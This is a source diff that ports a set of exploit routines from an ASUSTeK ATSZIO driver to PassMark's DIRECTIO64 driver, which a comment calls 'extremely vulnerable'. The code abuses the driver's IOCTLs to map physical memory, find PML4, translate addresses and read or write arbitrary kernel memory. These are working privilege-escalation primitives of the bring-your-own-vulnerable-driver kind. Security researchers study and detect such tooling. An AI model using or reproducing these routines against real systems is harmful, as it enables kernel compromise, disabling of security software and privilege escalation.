@@ -2,13 +2,13 @@
 *
 *  (C) COPYRIGHT AUTHORS, 2020 - 2021
 *
-*  TITLE:       ATSZIO.CPP
+*  TITLE:       DIRECTIO64.CPP
 *
 *  VERSION:     1.11
 *
 *  DATE:        19 Apr 2021
 *
-*  ASUSTeK ATSZIO WinFlash driver routines.
+*  PassMark DIRECTIO driver routines.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -18,81 +18,82 @@
 *******************************************************************************/
 
 #include "global.h"
-#include "idrv/atszio.h"
+#include "idrv/directio64.h"
 
 //
-// Based on ASUSTeK header and lib files
-// https://github.com/DOGSHITD/SciDetectorApp/tree/master/DetectSciApp
-//
-// Another reference https://github.com/LimiQS/AsusDriversPrivEscala
+// PassMark's DIRECTIO interface.
+// 
+// N.B. This driver itself is *extremely* vulnerable/bugged.
 //
 
 /*
-* AtszioMapMemory
+* DI64MapMemory
 *
 * Purpose:
 *
 * Map physical memory through \Device\PhysicalMemory.
 *
 */
-PVOID AtszioMapMemory(
+PVOID DI64MapMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
     _In_ ULONG NumberOfBytes,
-    _Out_ HANDLE* SectionHandle
-)
+    _Out_ HANDLE* SectionHandle,
+    _Out_ PVOID* AllocatedMdl,
+    _In_ BOOLEAN MapForWrite)
 {
-    ULONG_PTR offset;
-    ULONG mapSize;
-    ATSZIO_PHYSICAL_MEMORY_INFO request;
+    DIRECTIO_PHYSICAL_MEMORY_INFO request;
 
     *SectionHandle = NULL;
+    *AllocatedMdl = NULL;
+
+    ULONG_PTR offset = PhysicalAddress & 0xFFFFFFFFFFFFF000;
+    ULONG mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;
 
     RtlSecureZeroMemory(&request, sizeof(request));
-
-    offset = PhysicalAddress & 0xFFFFFFFFFFFFF000;
-    mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;
-
-    request.Offset.QuadPart = offset;
     request.ViewSize = mapSize;
+    request.Offset.QuadPart = offset;
+    request.Writeable = MapForWrite;
 
     if (supCallDriver(DeviceHandle,
-        IOCTL_ATSZIO_MAP_USER_PHYSICAL_MEMORY,
+        IOCTL_DIRECTIO_MAP_PHYSICAL_MEMORY,
         &request,
         sizeof(request),
         &request,
-        sizeof(request)))
+        sizeof(request))) 
     {
         *SectionHandle = request.SectionHandle;
-        return request.MappedBaseAddress;
+        *AllocatedMdl = request.AllocatedMdl;
+        return request.BaseAddress;
     }
 
     return NULL;
 }
 
 /*
-* AtszioUnmapMemory
+* DI64UnmapMemory
 *
 * Purpose:
 *
 * Unmap previously mapped physical memory.
 *
 */
-VOID AtszioUnmapMemory(
+VOID DI64UnmapMemory(
     _In_ HANDLE DeviceHandle,
     _In_ PVOID SectionToUnmap,
-    _In_ HANDLE SectionHandle
+    _In_ HANDLE SectionHandle,
+    _In_ PVOID AllocatedMdl
 )
 {
-    ATSZIO_PHYSICAL_MEMORY_INFO request;
+    DIRECTIO_PHYSICAL_MEMORY_INFO request;
 
     RtlSecureZeroMemory(&request, sizeof(request));
-
+    request.BaseAddress = SectionToUnmap;
+    request.AllocatedMdl = AllocatedMdl;
     request.SectionHandle = SectionHandle;
-    request.MappedBaseAddress = SectionToUnmap;
 
     supCallDriver(DeviceHandle,
-        IOCTL_ATSZIO_UNMAP_USER_PHYSICAL_MEMORY,
+        IOCTL_DIRECTIO_UNMAP_PHYSICAL_MEMORY,
         &request,
         sizeof(request),
         &request,
@@ -100,30 +101,34 @@ VOID AtszioUnmapMemory(
 }
 
 /*
-* AtszioQueryPML4Value
+* DI64QueryPML4Value
 *
 * Purpose:
 *
 * Locate PML4.
 *
 */
-BOOL WINAPI AtszioQueryPML4Value(
+BOOL WINAPI DI64QueryPML4Value(
     _In_ HANDLE DeviceHandle,
     _Out_ ULONG_PTR* Value)
 {
     ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
-    HANDLE sectionHandle = NULL;
 
-    DWORD cbRead = 0x100000;
+    ULONG cbRead = 0x100000;
+
+    PVOID refObject = NULL;
+    HANDLE sectionHandle = NULL;
 
     *Value = 0;
 
     SetLastError(ERROR_SUCCESS);
 
-    pbLowStub1M = (ULONG_PTR)AtszioMapMemory(DeviceHandle,
+    pbLowStub1M = (ULONG_PTR)DI64MapMemory(DeviceHandle,
         0ULL,
         cbRead,
-        &sectionHandle);
+        &sectionHandle,
+        &refObject,
+        FALSE);
 
     if (pbLowStub1M) {
 
@@ -131,9 +136,10 @@ BOOL WINAPI AtszioQueryPML4Value(
         if (PML4)
             *Value = PML4;
 
-        AtszioUnmapMemory(DeviceHandle,
+        DI64UnmapMemory(DeviceHandle,
             (PVOID)pbLowStub1M,
-            sectionHandle);
+            sectionHandle,
+            refObject);
 
     }
 
@@ -141,14 +147,14 @@ BOOL WINAPI AtszioQueryPML4Value(
 }
 
 /*
-* AtszioReadWritePhysicalMemory
+* DI64ReadWritePhysicalMemory
 *
 * Purpose:
 *
 * Read/Write physical memory.
 *
 */
-BOOL WINAPI AtszioReadWritePhysicalMemory(
+BOOL WINAPI DI64ReadWritePhysicalMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
     _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
@@ -158,16 +164,18 @@ BOOL WINAPI AtszioReadWritePhysicalMemory(
     BOOL bResult = FALSE;
     DWORD dwError = ERROR_SUCCESS;
     PVOID mappedSection = NULL;
-    ULONG_PTR offset;
+
+    PVOID allocMdl = NULL;
     HANDLE sectionHandle = NULL;
 
-    //
-    // Map physical memory section.
-    //
-    mappedSection = AtszioMapMemory(DeviceHandle,
+    ULONG_PTR offset;
+
+    mappedSection = DI64MapMemory(DeviceHandle,
         PhysicalAddress,
         NumberOfBytes,
-        &sectionHandle);
+        &sectionHandle,
+        &allocMdl,
+        DoWrite);
 
     if (mappedSection) {
 
@@ -184,17 +192,16 @@ BOOL WINAPI AtszioReadWritePhysicalMemory(
 
             bResult = TRUE;
         }
-        __except (EXCEPTION_EXECUTE_HANDLER) {
+        __except (EXCEPTION_EXECUTE_HANDLER)
+        {
             bResult = FALSE;
             dwError = GetExceptionCode();
         }
 
-        //
-        // Unmap physical memory section.
-        //
-        AtszioUnmapMemory(DeviceHandle,
+        DI64UnmapMemory(DeviceHandle,
             mappedSection,
-            sectionHandle);
+            sectionHandle,
+            allocMdl);
 
     }
     else {
@@ -206,20 +213,20 @@ BOOL WINAPI AtszioReadWritePhysicalMemory(
 }
 
 /*
-* AtszioReadPhysicalMemory
+* DI64ReadPhysicalMemory
 *
 * Purpose:
 *
 * Read from physical memory.
 *
 */
-BOOL WINAPI AtszioReadPhysicalMemory(
+BOOL WINAPI DI64ReadPhysicalMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
     _In_ PVOID Buffer,
     _In_ ULONG NumberOfBytes)
 {
-    return AtszioReadWritePhysicalMemory(DeviceHandle,
+    return DI64ReadWritePhysicalMemory(DeviceHandle,
         PhysicalAddress,
         Buffer,
         NumberOfBytes,
@@ -227,20 +234,20 @@ BOOL WINAPI AtszioReadPhysicalMemory(
 }
 
 /*
-* AtszioWritePhysicalMemory
+* DI64WritePhysicalMemory
 *
 * Purpose:
 *
 * Write to physical memory.
 *
 */
-BOOL WINAPI AtszioWritePhysicalMemory(
+BOOL WINAPI DI64WritePhysicalMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
     _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
     _In_ ULONG NumberOfBytes)
 {
-    return AtszioReadWritePhysicalMemory(DeviceHandle,
+    return DI64ReadWritePhysicalMemory(DeviceHandle,
         PhysicalAddress,
         Buffer,
         NumberOfBytes,
@@ -248,34 +255,34 @@ BOOL WINAPI AtszioWritePhysicalMemory(
 }
 
 /*
-* AtszioVirtualToPhysical
+* DI64VirtualToPhysical
 *
 * Purpose:
 *
 * Translate virtual address to the physical.
 *
 */
-BOOL WINAPI AtszioVirtualToPhysical(
+BOOL WINAPI DI64VirtualToPhysical(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR VirtualAddress,
     _Out_ ULONG_PTR* PhysicalAddress)
 {
     return PwVirtualToPhysical(DeviceHandle,
-        AtszioQueryPML4Value,
-        AtszioReadPhysicalMemory,
+        DI64QueryPML4Value,
+        DI64ReadPhysicalMemory,
         VirtualAddress,
         PhysicalAddress);
 }
 
 /*
-* AtszioWriteKernelVirtualMemory
+* DI64ReadKernelVirtualMemory
 *
 * Purpose:
 *
-* Write virtual memory via ATSZIO.
+* Read virtual memory.
 *
 */
-BOOL WINAPI AtszioWriteKernelVirtualMemory(
+BOOL WINAPI DI64ReadKernelVirtualMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR Address,
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
@@ -286,17 +293,17 @@ BOOL WINAPI AtszioWriteKernelVirtualMemory(
 
     SetLastError(ERROR_SUCCESS);
 
-    bResult = AtszioVirtualToPhysical(DeviceHandle,
+    bResult = DI64VirtualToPhysical(DeviceHandle,
         Address,
         &physicalAddress);
 
     if (bResult) {
 
-        bResult = AtszioReadWritePhysicalMemory(DeviceHandle,
+        bResult = DI64ReadWritePhysicalMemory(DeviceHandle,
             physicalAddress,
             Buffer,
             NumberOfBytes,
-            TRUE);
+            FALSE);
 
     }
 
@@ -304,17 +311,17 @@ BOOL WINAPI AtszioWriteKernelVirtualMemory(
 }
 
 /*
-* AtszioReadKernelVirtualMemory
+* DI64WriteKernelVirtualMemory
 *
 * Purpose:
 *
-* Read virtual memory via ATSZIO.
+* Write virtual memory.
 *
 */
-BOOL WINAPI AtszioReadKernelVirtualMemory(
+BOOL WINAPI DI64WriteKernelVirtualMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR Address,
-    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
+    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
     _In_ ULONG NumberOfBytes)
 {
     BOOL bResult;
@@ -322,17 +329,17 @@ BOOL WINAPI AtszioReadKernelVirtualMemory(
 
     SetLastError(ERROR_SUCCESS);
 
-    bResult = AtszioVirtualToPhysical(DeviceHandle,
+    bResult = DI64VirtualToPhysical(DeviceHandle,
         Address,
         &physicalAddress);
 
     if (bResult) {
 
-        bResult = AtszioReadWritePhysicalMemory(DeviceHandle,
+        bResult = DI64ReadWritePhysicalMemory(DeviceHandle,
             physicalAddress,
             Buffer,
             NumberOfBytes,
-            FALSE);
+            TRUE);
 
     }
 
